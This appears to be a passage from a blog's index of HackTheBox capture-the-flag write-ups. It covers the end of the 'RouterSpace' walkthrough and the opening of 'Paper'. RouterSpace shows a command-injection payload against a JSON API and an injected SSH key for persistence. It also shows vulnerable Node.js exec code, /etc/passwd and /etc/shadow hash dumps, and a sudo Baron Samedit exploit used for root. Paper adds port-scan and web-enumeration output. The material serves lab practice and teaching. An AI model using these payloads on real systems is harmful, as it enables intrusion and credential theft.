‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ        ‚îÇ File: AndroidManifest.xml        ‚îÇ Size: 1.1 KB ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ    1   ‚îÇ &lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:compileSdkVersion=\"30\" android:compileSdkVersionCodename=\"11\" package=\"com.routerspace\" platform        ‚îÇ BuildVersionCode=\"30\" platformBuildVersionName=\"11\"&gt;    2   ‚îÇ     &lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt;    3   ‚îÇ     &lt;application android:allowBackup=\"false\" android:appComponentFactory=\"androidx.core.app.CoreComponentFactory\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:name=\"com.routerspace.MainApplication        ‚îÇ \" android:roundIcon=\"@mipmap/ic_launcher\" android:theme=\"@style/AppTheme\"&gt;    4   ‚îÇ         &lt;activity android:configChanges=\"keyboard|keyboardHidden|orientation|screenSize|uiMode\" android:label=\"@string/app_name\" android:launchMode=\"singleTask\" android:name=\"com.routerspace.MainActivity\" android:windowSoftInpu        ‚îÇ tMode=\"adjustResize\"&gt;    5   ‚îÇ             &lt;intent-filter&gt;    6   ‚îÇ                 &lt;action android:name=\"android.intent.action.MAIN\"/&gt;    7   ‚îÇ                 &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;    8   ‚îÇ             &lt;/intent-filter&gt;    9   ‚îÇ         &lt;/activity&gt;   10   ‚îÇ     &lt;/application&gt;   11   ‚îÇ &lt;/manifest&gt;   Ran the APK on Genymotion (used Android 6.0 because no android:minSdkVersion have been found, so older Android device can be used and certificates can be imported easily):    Set up the environment:   Intercepted APK traffic:    POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1 accept: application/json, text/plain, */* user-agent: RouterSpaceAgent Content-Type: application/json Content-Length: 16 Host: routerspace.htb Connection: close Accept-Encoding: gzip, deflate  {\"ip\":\"0.0.0.0\"}   Exploitation  Command Injection in deviceAccess API  Request:  POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1 accept: application/json, text/plain, */* user-agent: RouterSpaceAgent Content-Type: application/json Content-Length: 19 Host: routerspace.htb Connection: close Accept-Encoding: gzip, deflate  {\"ip\":\"0.0.0.0;id\"}   Responde:  HTTP/1.1 200 OK X-Powered-By: RouterSpace X-Cdn: RouterSpace-19542 Content-Type: application/json; charset=utf-8 Content-Length: 60 ETag: W/\"3c-sZwJm+90xtMPuuO1H89HShTmFxY\" Date: Sat, 07 May 2022 19:25:32 GMT Connection: close  \"0.0.0.0\\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\\n\"   Added a custom SSH key to paul because target machine wasn‚Äôt able to connect back to attacker machine:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/RouterSpace/exploit] ‚îî‚îÄ$ ssh-keygen -b 2048 -t rsa -f paul -q -N \"\"  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/RouterSpace/exploit] ‚îî‚îÄ$ cat paul.pub | xclip -sel c  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/RouterSpace/exploit] ‚îî‚îÄ$ chmod 500 paul   POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1 accept: application/json, text/plain, */* user-agent: RouterSpaceAgent Content-Type: application/json Content-Length: 440 Host: routerspace.htb Connection: close Accept-Encoding: gzip, deflate  {\"ip\":\"0.0.0.0;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8n5jjOE4i+yYLB4O9fBEclxopEOlKh45pBAGTOnc1H9A5O0n4pxcx9Ps/W3/oz6snuDIWlJuPfdBXKXU2rlf4XJ2aD7hpG2ZTWy7r+iQOaHnmNV4yGtNIA/ztFbQyUZjpDJxJZuxgA7WpH9shA9HUBlzQP6uk6BadMg4w5oDfA72063SAcgRpPQiv29YufFop7uY6jDDgkjnYPWfZW3mQ+GaWFyMPlK3g9nqYoPceOx2mb+1cBSl91eTkm04a/g7JaNYyzvN6KUPezKRcI37reOY5u6zGHsHIgzrFNsijk3BMptnOI/DNvxZ5cnYDMyVJC7CQyAKoBpTOU0YEBl4b kali@kali' &gt;&gt; ~/.ssh/authorized_keys\"}   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/RouterSpace/exploit] ‚îî‚îÄ$ ssh paul@routerspace.htb -i paul The authenticity of host 'routerspace.htb (10.10.11.148)' can't be established. ED25519 key fingerprint is SHA256:iwHQgWKu/VDyjka2Y4j2V8P2Rk6K13HuNT4JTnITIDk. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'routerspace.htb' (ED25519) to the list of known hosts. Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)   * Documentation:  https://help.ubuntu.com  * Management:     https://landscape.canonical.com  * Support:        https://ubuntu.com/advantage    System information as of Sat 07 May 2022 07:34:49 PM UTC    System load:           0.0   Usage of /:            70.7% of 3.49GB   Memory usage:          17%   Swap usage:            0%   Processes:             219   Users logged in:       0   IPv4 address for eth0: 10.10.11.148   IPv6 address for eth0: dead:beef::250:56ff:feb9:4de8   * Super-optimized for small spaces - read how we shrank the memory    footprint of MicroK8s to make it the smallest full K8s around.     https://ubuntu.com/blog/microk8s-memory-optimisation  80 updates can be applied immediately. 31 of these updates are standard security updates. To see these additional updates run: apt list --upgradable  The list of available updates is more than a week old. To check for new updates run: sudo apt update  Last login: Sat Nov 20 18:30:35 2021 from 192.168.150.133 paul@routerspace:~$ id; hostname; ip a; cat ~/user.txt uid=1001(paul) gid=1001(paul) groups=1001(paul) routerspace.htb 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00     inet 127.0.0.1/8 scope host lo        valid_lft forever preferred_lft forever     inet6 ::1/128 scope host        valid_lft forever preferred_lft forever 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000     link/ether 00:50:56:b9:4d:e8 brd ff:ff:ff:ff:ff:ff     inet 10.10.11.148/23 brd 10.10.11.255 scope global eth0        valid_lft forever preferred_lft forever     inet6 dead:beef::250:56ff:feb9:4de8/64 scope global dynamic mngtmpaddr        valid_lft 86396sec preferred_lft 14396sec     inet6 fe80::250:56ff:feb9:4de8/64 scope link        valid_lft forever preferred_lft forever 18f213ac5d7fbc0935d14062481cf7cf   Vulnerable Code  index.js  ... app.post(                                                                                                                                                                                                                                      \"/api/v4/monitoring/router/dev/check/deviceAccess\",                                                                                                                                                                                          checkAgent,                                                                                                                                                                                                                                  async function (req, res) {                                                                                                                                                                                                                    var options = {                                                                                                                                                                                                                                encoding: \"utf8\",                                                                                                                                                                                                                          };                                                                                                                                                                                                                                           var ip = req.body[\"ip\"];                                                                                                                                                                                                                     const exec = promisify(require('child_process').exec);                                                                                                                                                                                       exec(\"echo \" + ip, options).then(({ stdout }) =&gt; res.json(stdout).send()).catch(res.json);                                                                                                                                                 }                                                                                                                                                                                                                                          ); ...   Privilege Escalation  Local enumeration  Enumerated passwd:  paul@routerspace:~$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false paul:x:1001:1001:,,,:/home/paul:/bin/bash   Enumerated hardcoded credentials:  paul@routerspace:/opt/www/public/routerspace$ cat index.js var express = require(\"express\"); const path = require(\"path\"); const app = express(); const { check, oneOf, validationResult } = require(\"express-validator\"); const promisify = require('util').promisify;  const port = 80; const tokenSecret = \"v%XsfkyZ#2SsfY9F--ippsec.rocks--x0o^VvYSRCw$5#MKi5\"; const userAgent = \"RouterSpaceAgent\"; const payload = [   \"paul@routerspace.htb\",   \"*******************\",   \"Hyakutake-0x1\", ]; ... app.post(                                                                                                                                                                                                                                      \"/api/v4/monitoring/router/dev/check/deviceAccess\",                                                                                                                                                                                          checkAgent,                                                                                                                                                                                                                                  async function (req, res) {                                                                                                                                                                                                                    var options = {                                                                                                                                                                                                                                encoding: \"utf8\",                                                                                                                                                                                                                          };                                                                                                                                                                                                                                           var ip = req.body[\"ip\"];                                                                                                                                                                                                                     const exec = promisify(require('child_process').exec);                                                                                                                                                                                       exec(\"echo \" + ip, options).then(({ stdout }) =&gt; res.json(stdout).send()).catch(res.json);                                                                                                                                                 }                                                                                                                                                                                                                                          );   Enumerated possible exploit  ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Executing Linux Exploit Suggester ‚ïö https://github.com/mzet-/linux-exploit-suggester [+] [CVE-2021-4034] PwnKit     Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt    Exposure: probable    Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro    Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main  [+] [CVE-2021-3156] sudo Baron Samedit     Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt    Exposure: probable    Tags: mint=19,[ ubuntu=18|20 ], debian=10    Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main  [+] [CVE-2021-3156] sudo Baron Samedit 2     Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt    Exposure: probable    Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10    Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main  [+] [CVE-2021-22555] Netfilter heap out-of-bounds write     Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html    Exposure: probable    Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}    Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c    ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c    Comments: ip_tables kernel module must be loaded  [+] [CVE-2017-5618] setuid screen v4.5.0 LPE     Details: https://seclists.org/oss-sec/2017/q1/184    Exposure: less probable    Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154   CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit)  https://github.com/CptGibbon/CVE-2021-3156  Enumerated the target for the correct versions:  paul@routerspace:~$ sudo -V Sudo version 1.8.31  OS: Linux version 5.4.0-90-generic (buildd@lgw01-amd64-054) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 User &amp; Groups: uid=1001(paul) gid=1001(paul) groups=1001(paul) Hostname: routerspace.htb Writable folder: /dev/shm [+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h) [+] /usr/bin/nc is available for network discover &amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h)   Copied the entire PoC folder on the machine:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/RouterSpace/exploit] ‚îî‚îÄ$ scp -r -i paul CVE-2021-3156 paul@routerspace.htb:/home/paul/CVE shellcode.c                                                                                                                                                                                               100%  599    12.9KB/s   00:00 x.so.2                                                                                                                                                                                                    100%   13KB 178.4KB/s   00:00 HEAD                                                                                                                                                                                                      100%   21     0.6KB/s   00:00 HEAD                                                                                                                                                                                                      100%  178     3.3KB/s   00:00 main                                                                                                                                                                                                      100%  178     4.8KB/s   00:00 HEAD                                                                                                                                                                                                      100%  178     4.5KB/s   00:00 index                                                                                                                                                                                                     100%  441    11.5KB/s   00:00 packed-refs                                                                                                                                                                                               100%  112     3.1KB/s   00:00 main                                                                                                                                                                                                      100%   41     1.0KB/s   00:00 HEAD                                                                                                                                                                                                      100%   30     0.8KB/s   00:00 config                                                                                                                                                                                                    100%  263     6.6KB/s   00:00 exclude                                                                                                                                                                                                   100%  240     6.3KB/s   00:00 update.sample                                                                                                                                                                                             100% 3650    91.9KB/s   00:00 pre-merge-commit.sample                                                                                                                                                                                   100%  416    11.3KB/s   00:00 pre-receive.sample                                                                                                                                                                                        100%  544    14.7KB/s   00:00 pre-rebase.sample                                                                                                                                                                                         100% 4898   123.3KB/s   00:00 post-update.sample                                                                                                                                                                                        100%  189     4.8KB/s   00:00 push-to-checkout.sample                                                                                                                                                                                   100% 2783    49.3KB/s   00:00 commit-msg.sample                                                                                                                                                                                         100%  896    24.2KB/s   00:00 pre-push.sample                                                                                                                                                                                           100% 1374    37.0KB/s   00:00 fsmonitor-watchman.sample                                                                                                                                                                                 100% 4655   119.4KB/s   00:00 applypatch-msg.sample                                                                                                                                                                                     100%  478    12.9KB/s   00:00 pre-applypatch.sample                                                                                                                                                                                     100%  424    11.3KB/s   00:00 pre-commit.sample                                                                                                                                                                                         100% 1643    44.2KB/s   00:00 prepare-commit-msg.sample                                                                                                                                                                                 100% 1492    39.5KB/s   00:00 pack-03e9e7d8779c604437eed1ee00f55f70de330ba7.idx                                                                                                                                                         100% 1436    35.5KB/s   00:00 pack-03e9e7d8779c604437eed1ee00f55f70de330ba7.pack                                                                                                                                                        100% 4227   100.9KB/s   00:00 description                                                                                                                                                                                               100%   73     1.7KB/s   00:00 Dockerfile                                                                                                                                                                                                100%  332     8.8KB/s   00:00 exploit.c                                                                                                                                                                                                 100% 2048    54.2KB/s   00:00 README.md                                                                                                                                                                                                 100%  692    18.5KB/s   00:00 Makefile                                                                                                                                                                                                  100%  208     5.6KB/s   00:00 exploit                                                                                                                                                                                                   100%   16KB 364.7KB/s   00:00   Compiled the exploit and obtained the flag:  paul@routerspace:~/CVE$ make mkdir libnss_x cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c cc -O3 -o exploit exploit.c paul@routerspace:~/CVE$ ./exploit ## id; hostname; ip a; cat /root/root.txt uid=0(root) gid=0(root) groups=0(root),1001(paul) routerspace.htb 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00     inet 127.0.0.1/8 scope host lo        valid_lft forever preferred_lft forever     inet6 ::1/128 scope host        valid_lft forever preferred_lft forever 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000     link/ether 00:50:56:b9:4d:e8 brd ff:ff:ff:ff:ff:ff     inet 10.10.11.148/23 brd 10.10.11.255 scope global eth0        valid_lft forever preferred_lft forever     inet6 dead:beef::250:56ff:feb9:4de8/64 scope global dynamic mngtmpaddr        valid_lft 86394sec preferred_lft 14394sec     inet6 fe80::250:56ff:feb9:4de8/64 scope link        valid_lft forever preferred_lft forever 83567d243b7de6ad84e6b2a4543a24ee     Trophy    User.txt  18f213ac5d7fbc0935d14062481cf7cf  Root.txt  83567d243b7de6ad84e6b2a4543a24ee  /etc/shadow  ## cat /etc/shadow | grep '\\$' root:$6$lw6PWI9kEABNZiKm$UoysFK0xDZgFk828w.7t30d8iRi6Qxv9xTkwvjJPRRxJvFQwTOkjvUq5y4OUO/LYV8KlqORQ4kolNeDfGFQd5.:18956:0:99999:7::: paul:$6$XYKUEvTt794C63vT$Y7MYBAH81SB.kZujevBehnueBAwIX3PeYPwilZ1L1DDhFFaGxac8p8N2411NWl7.dPSb6nLYor8Jf1oyM5wSf1:19044:0:99999:7:::"
  },
  
  {
    "title": "HackTheBox - Paper",
    "url": "/posts/paper/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2022-06-19 00:00:00 +0200",
    "content": "Resolution summary     A server response from the HTTP web server discloses a DNS that points to a Wordpress blog vulnerable to Unauthenticated View Private/Draft Posts (CVE-2019-17671)   Exploiting the vulnerability we are able to leak restricted data, containing a secret registration token for RocketChat that allows us to create a custom user and access a restricted chat   On RocketChat it is possible to exploit some insecure functionalities of a custom bot in order to leaks recyclops credentials and reuse them to access the machine as dwight   The machine is vulnerable to Polkit Privilege Escalation (CVE-2021-3560). It is possible to create a custom sudoer account and thus escalate to root.   Improved skills     Enumeration and exploitations of leaked secrets   Exploiting Wordpress known vulnerabilities   Abusing intended features lacking of security controls   Exploitation of Polkit Privilege Escalation   Used tools     nmap   gobuster   wpscan   linpeas.sh     Information Gathering  Scanned all TCP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Paper] ‚îî‚îÄ$ sudo nmap -sS -p- 10.10.11.143 -v -oN scan/all-tcp-ports.txt  [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 17:24 EDT Initiating Ping Scan at 17:24 Scanning 10.10.11.143 [4 ports] ... PORT    STATE SERVICE 22/tcp  open  ssh 80/tcp  open  http 443/tcp open  https  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 19.85 seconds   Enumerated open TCP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Paper] ‚îî‚îÄ$ sudo nmap -sT -sV -sC -p22,80,443 10.10.11.143 -oN scan/open-tcp-ports.txt Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 17:25 EDT Nmap scan report for 10.10.11.143 Host is up (0.040s latency).  PORT    STATE SERVICE  VERSION 22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: |   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) |   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 |_http-title: HTTP Server Test Page powered by CentOS | http-methods: |_  Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-title: HTTP Server Test Page powered by CentOS | http-methods: |_  Potentially risky methods: TRACE |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US | Subject Alternative Name: DNS:localhost.localdomain | Not valid before: 2021-07-03T08:52:34 |_Not valid after:  2022-07-08T10:32:34 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_  http/1.1 |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.17 seconds   Enumerated top 200 UDP ports:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Paper] ‚îî‚îÄ$ sudo nmap -sU --top-ports 200 10.10.11.143 -oN scan/top_200-udp-ports.txt [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 17:39 EDT Nmap scan report for 10.10.11.143 Host is up (0.040s latency). Not shown: 199 closed udp ports (port-unreach) PORT     STATE         SERVICE 5353/udp open|filtered zeroconf  Nmap done: 1 IP address (1 host up) scanned in 208.18 seconds   Enumeration  Port 80 - HTTP (Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9))  Browsed port 80:    HTTP/1.1 403 Forbidden Date: Sat, 07 May 2022 21:41:58 GMT Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 X-Backend-Server: office.paper Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT ETag: \"30c0b-5c5c7fdeec240\" Accept-Ranges: bytes Content-Length: 199691 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8  Discovered the domain office.paper.  Enumerated web files and directories:  $ gobuster dir -u http://10.10.11.143 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 25 -o scan/p80-dirs.txt ... /manual               (Status: 301) [Size: 235] [--&gt; http://10.10.11.143/manual/]  $ gobuster dir -u http://10.10.11.143 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 25 -o scan/p80-files.txt ... /.htaccess            (Status: 403) [Size: 199] /.                    (Status: 403) [Size: 199691] /.html                (Status: 403) [Size: 199] /.htpasswd            (Status: 403) [Size: 199] /.htm                 (Status: 403) [Size: 199] /.htpasswds           (Status: 403) [Size: 199] /.htgroup             (Status: 403) [Size: 199] /poweredby.png        (Status: 200) [Size: 5714] /.htaccess.bak        (Status: 403) [Size: 199] /.htuser              (Status: 403) [Size: 199] /.htc                 (Status: 403) [Size: 199] /.ht                  (Status: 403) [Size: 199] /dispatch.fcgi        (Status: 403) [Size: 199] /mytias.fcgi          (Status: 403) [Size: 199] /test.fcgi            (Status: 403) [Size: 199]   office.paper - (wordpress 5.2.3)  Added office.paper to /etc/hosts  ## echo '10.10.11.143    office.paper' &gt;&gt; /etc/hosts     Enumerated posts and comments:  http://office.paper/?s=       Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick        Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think! -Nick           Enumerated wordpress using wpscan:        ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Paper]   ‚îî‚îÄ$ wpscan --url office.paper   ...   [+] URL: http://office.paper/ [10.10.11.143]   [+] Started: Sat May  7 17:54:40 2022        Interesting Finding(s):        [+] Headers    | Interesting Entries:    |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9    |  - X-Powered-By: PHP/7.2.24    |  - X-Backend-Server: office.paper    | Found By: Headers (Passive Detection)    | Confidence: 100%        [+] WordPress readme found: http://office.paper/readme.html    | Found By: Direct Access (Aggressive 